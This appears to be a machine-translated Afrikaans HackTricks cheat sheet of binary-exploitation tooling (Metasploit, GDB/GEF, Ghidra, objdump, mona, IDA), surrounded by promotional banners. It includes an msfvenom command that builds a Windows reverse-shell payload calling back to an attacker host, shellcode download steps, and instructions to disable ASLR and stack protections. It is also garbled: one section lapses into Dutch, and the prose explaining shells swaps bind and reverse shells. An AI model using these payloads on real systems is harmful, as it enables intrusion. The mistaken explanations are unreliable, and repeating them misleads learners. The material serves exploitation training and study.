<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-opslagplekke.

</details>


# Metasploit
```
pattern_create.rb -l 3000   #Length
pattern_offset.rb -l 3000 -q 5f97d534   #Search offset
nasm_shell.rb
nasm> jmp esp   #Get opcodes
msfelfscan -j esi /opt/fusion/bin/level01
```
## Skulpe

'n Skulp is 'n klein stukkie uitvoerbare kode wat gebruik word in die uitbuiting van 'n sekuriteitskwesbaarheid om toegang tot 'n rekenaarstelsel te verkry. Dit is gewoonlik in masjienkode en word gebruik om 'n spesifieke taak uit te voer, soos die verkryging van beheer oor 'n stelsel of die uitvoering van 'n sekere funksie.

Skulpe word dikwels gebruik in die konteks van aanvalle soos bufferoorloopaanvalle, waar die aanvaller probeer om buite die grense van 'n toegewysde geheuegebied te skryf en sodoende die uitvoering van eie kode te bewerkstellig. Hierdie kode kan dan gebruik word om die aanvaller toegang tot die stelsel te gee, vertroulike inligting te steel of ander skadelike aktiwiteite uit te voer.

Daar is verskillende tipes skulpe, insluitend bindskulpe en omgekeerde skulpe. 'n Bindskulp is 'n stukkie kode wat 'n verbinding met die aanvaller se stelsel vestig en die beheer oor die aangevalle stelsel oorneem. 'n Omgekeerde skulp daarenteen maak dit vir die aanvaller moontlik om 'n verbinding met die aangevalle stelsel te maak en dit vanaf sy eie stelsel te beheer.

Die ontwikkeling van skulpe vereis 'n goeie begrip van masjienkode en die spesifieke stelsel waarop dit uitgevoer word. Dit is belangrik om te verseker dat die skulp korrek geoptimaliseer is vir die teikenstelsel en dat dit nie opgespoor of geblokkeer kan word deur sekuriteitsmaatreëls nie.
```
msfvenom /p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> [EXITFUNC=thread] [-e x86/shikata_ga_nai] -b "\x00\x0a\x0d" -f c
```
# GDB

## Installeer

Om GDB te installeren, volg je de onderstaande stappen:

### Linux

1. Open een terminalvenster.
2. Voer het volgende commando in om GDB te installeren:

   ```bash
   sudo apt-get install gdb
   ```

### macOS

1. Open een terminalvenster.
2. Voer het volgende commando in om GDB te installeren met Homebrew:

   ```bash
   brew install gdb
   ```

### Windows

1. Download de GDB-installatiebestanden van de officiële website.
2. Voer het installatieprogramma uit en volg de instructies op het scherm.

Zodra de installatie is voltooid, kun je GDB gebruiken om programma's te debuggen en te analyseren.
```
apt-get install gdb
```
## Parameters

**-q** --> Geen banner wysig\
**-x \<lêer>** --> Voer GDB instruksies outomaties uit vanaf hier\
**-p \<pid>** --> Koppel aan proses

### Instruksies

\> **disassemble main** --> Ontleed die funksie\
\> **disassemble 0x12345678**\
\> **set disassembly-flavor intel**\
\> **set follow-fork-mode child/parent** --> Volg geskep prosesse\
\> **p system** --> Vind die adres van die system funksie\
\> **help**\
\> **quit**

\> **br func**  --> Voeg breekpunt by funksie by\
\> **br \*func+23**\
\> **br \*0x12345678**\
**> del NUM** --> Verwyder daardie aantal breekpunte\
\> **watch UITDRUKKING** --> Breek as die waarde verander

**> run** --> Voer uit\
**> start** --> Begin en breek in main\
\> **n/next** --> Voer volgende instruksie uit (nie binne nie)\
\> **s/step** --> Voer volgende instruksie uit\
\> **c/continue** --> Gaan voort tot volgende breekpunt

\> **set $eip = 0x12345678** --> Verander waarde van $eip\
\> **info functions** --> Inligting oor funksies\
\> **info functions func** --> Inligting oor die funksie\
\> **info registers** --> Waarde van die registers\
\> **bt** --> Stapel\
\> **bt full** --> Gedetailleerde stapel

\> **print veranderlike**\
\> **print 0x87654321 - 0x12345678** --> Bereken\
\> **examine o/x/u/t/i/s dir\_mem/reg/puntero** --> Wys inhoud in oktaal/heksadesimale/10/binêre/instruksie/ASCII

* **x/o 0xDir\_hex**
* **x/2x $eip** --> 2 Woorde vanaf EIP
* **x/2x $eip -4** -->  $eip - 4
* **x/8xb $eip** --> 8 byte (b-> byte, h-> 2 byte, w-> 4 byte, g-> 8 byte)
* **i r eip** --> Waarde van $eip
* **x/w pointer** --> Waarde van die wyser
* **x/s pointer** --> String wat deur die wyser aangedui word
* **x/xw \&pointer** --> Adres waar die wyser geleë is
* **x/i $eip** —> Instruksies van die EIP

## [GEF](https://github.com/hugsy/gef)
```bash
checksec #Check protections
p system #Find system function address
search-pattern "/bin/sh" #Search in the process memory
vmmap #Get memory mappings

#Shellcode
shellcode search x86 #Search shellcodes
shellcode get 61 #Download shellcode number 61

#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp

#Another way to get the offset of to the RIP
1- Put a bp after the function that overwrites the RIP and send a ppatern to ovwerwrite it
2- ef➤  i f
Stack level 0, frame at 0x7fffffffddd0:
rip = 0x400cd3; saved rip = 0x6261617762616176
called by frame at 0x7fffffffddd8
Arglist at 0x7fffffffdcf8, args:
Locals at 0x7fffffffdcf8, Previous frame's sp is 0x7fffffffddd0
Saved registers:
rbp at 0x7fffffffddc0, rip at 0x7fffffffddc8
gef➤  pattern search 0x6261617762616176
[+] Searching for '0x6261617762616176'
[+] Found at offset 184 (little-endian search) likely
```
## Truuks

### GDB dieselfde adresse

Terwyl jy GDB foutopsporing doen, sal GDB **effens verskillende adresse hê as die een wat deur die binêre lêer gebruik word wanneer dit uitgevoer word.** Jy kan GDB dieselfde adresse laat hê deur die volgende te doen:

* `unset env LINES`
* `unset env COLUMNS`
* `set env _=<pad>` _Plaas die absolute pad na die binêre lêer_
* Exploiteer die binêre lêer deur dieselfde absolute roete te gebruik
* `PWD` en `OLDPWD` moet dieselfde wees wanneer jy GDB gebruik en wanneer jy die binêre lêer uitbuit

### Terugvoetspoor om opgeroepde funksies te vind

Wanneer jy 'n **staties gekoppelde binêre lêer** het, sal al die funksies aan die binêre lêer behoort (en nie aan eksterne biblioteke nie). In hierdie geval sal dit moeilik wees om **die vloei te identifiseer wat die binêre lêer volg om byvoorbeeld vir gebruikersinvoer te vra**.\
Jy kan hierdie vloei maklik identifiseer deur die binêre lêer met **gdb** te **hardloop** totdat jy gevra word vir invoer. Stop dit dan met **CTRL+C** en gebruik die **`bt`** (**terugvoetspoor**) bevel om die opgeroepde funksies te sien:
```
gef➤  bt
#0  0x00000000004498ae in ?? ()
#1  0x0000000000400b90 in ?? ()
#2  0x0000000000400c1d in ?? ()
#3  0x00000000004011a9 in ?? ()
#4  0x0000000000400a5a in ?? ()
```
## GDB-bediener

`gdbserver --multi 0.0.0.0:23947` (in IDA moet jy die absolute pad van die uitvoerbare lêer in die Linux-masjien en in die Windows-masjien invul)

# Ghidra

## Vind stapelverskuiwing

**Ghidra** is baie nuttig om die **verskuiwing** vir 'n **buffer-oorvloei te vind danksy die inligting oor die posisie van die plaaslike veranderlikes.**\
Byvoorbeeld, in die voorbeeld hieronder, dui 'n buffer-oorvloei in `local_bc` aan dat jy 'n verskuiwing van `0xbc` benodig. Verder, as `local_10` 'n kanariekoek is, dui dit aan dat daar 'n verskuiwing van `0xac` is om dit vanaf `local_bc` te oorskryf.\
_Onthou dat die eerste 0x08 waar die RIP gestoor word, aan die RBP behoort._

![](<../../.gitbook/assets/image (616).png>)

# GCC

**gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack 1.2.c -o 1.2** --> Kompileer sonder beskerming\
**-o** --> Uitset\
**-g** --> Stoor kode (GDB sal dit kan sien)\
**echo 0 > /proc/sys/kernel/randomize\_va\_space** --> Om die ASLR in Linux te deaktiveer

**Om 'n skulpkode te kompileer:**\
**nasm -f elf assembly.asm** --> Gee 'n ".o"\
**ld assembly.o -o shellcodeout** --> Uitvoerbaar

# Objdump

**-d** --> Ontbind uitvoerbare afdelings (sien opkode van 'n gekompileerde skulpkode, vind ROP-toestelle, vind funksie-adres...)\
**-Mintel** --> **Intel** sintaksis\
**-t** --> **Simbole**-tabel\
**-D** --> Ontbind alles (adres van statiese veranderlike)\
**-s -j .dtors** --> dtors-afdeling\
**-s -j .got** --> got-afdeling\
\-D -s -j .plt --> **plt**-afdeling **ontbind**\
**-TR** --> **Herskikkinge**\
**ojdump -t --dynamic-relo ./exec | grep puts** --> Adres van "puts" om in GOT te wysig\
**objdump -D ./exec | grep "VAR\_NAME"** --> Adres van 'n statiese veranderlike (hierdie word in DATA-afdeling gestoor).

# Kernaflewerings

1. Voer `ulimit -c unlimited` uit voordat jy my program begin
2. Voer `sudo sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t` uit
3. sudo gdb --core=\<path/core> --quiet

# Meer

**ldd uitvoerbare | grep libc.so.6** --> Adres (as ASLR, verander dit dan elke keer)\
**for i in \`seq 0 20\`; do ldd \<Ejecutable> | grep libc; done** --> Lus om te sien of die adres baie verander\
**readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system** --> Verskuiwing van "system"\
**strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh** --> Verskuiwing van "/bin/sh"

**strace uitvoerbare** --> Funksies wat deur die uitvoerbare aangeroep word\
**rabin2 -i ejecutable -->** Adres van al die funksies

# **Inmunity debugger**
```bash
!mona modules    #Get protections, look for all false except last one (Dll of SO)
!mona find -s "\xff\xe4" -m name_unsecure.dll   #Search for opcodes insie dll space (JMP ESP)
```
# IDA

## Debugging in afgeleë Linux

Binêre lêers wat gebruik kan word om 'n binêre lêer binne 'n Linux te ontleed, kan binne die IDA-vouer gevind word. Om dit te doen, skuif die binêre lêer _linux\_server_ of _linux\_server64_ na die Linux-bediener en voer dit uit binne die vouer wat die binêre lêer bevat:
```
./linux_server64 -Ppass
```
Stel dan die debugger in: Debugger (linux remote) --> Proses opsies...:

![](<../../.gitbook/assets/image (101).png>)


<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
